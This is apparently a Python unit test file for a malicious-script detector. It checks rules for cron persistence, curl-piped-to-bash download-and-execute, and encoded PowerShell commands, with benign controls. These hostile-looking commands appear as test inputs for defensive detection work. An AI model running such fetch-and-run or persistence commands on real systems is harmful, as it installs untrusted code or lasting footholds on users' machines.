
import sys
import unittest
from pathlib import Path

# Allow tests to import detectors.py from the project root.
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from detectors import scan_script


class TestDetectionRules(unittest.TestCase):

    def test_cron_persistence(self):
        script = 'echo "* * * * * /tmp/task" | crontab -'
        findings = scan_script(script)

        self.assertTrue(
            any(f["id"] == "EXO-001" for f in findings),
            "Expected cron persistence detection"
        )

    def test_download_and_execute(self):
        script = "curl https://example.invalid/setup.sh | bash"
        findings = scan_script(script)

        self.assertTrue(
            any(f["id"] == "EXO-002" for f in findings),
            "Expected download-and-execute detection"
        )

    def test_powershell_encoded_command(self):
        script = "powershell.exe -EncodedCommand ZQBjAGgAbwA="
        findings = scan_script(script)

        self.assertTrue(
            any(f["id"] == "EXO-003" for f in findings),
            "Expected PowerShell encoded-command detection"
        )

    def test_benign_script(self):
        script = 'echo "Hello world"\ndate\npwd'
        findings = scan_script(script)

        self.assertEqual(
            findings, [],
            "Benign script should produce no findings"
        )

    def test_crontab_list_not_persistence(self):
        script = "crontab -l"
        findings = scan_script(script)

        self.assertFalse(
            any(f["id"] == "EXO-001" for f in findings),
            "Listing cron jobs should not trigger persistence detection"
        )


if __name__ == "__main__":
    unittest.main()
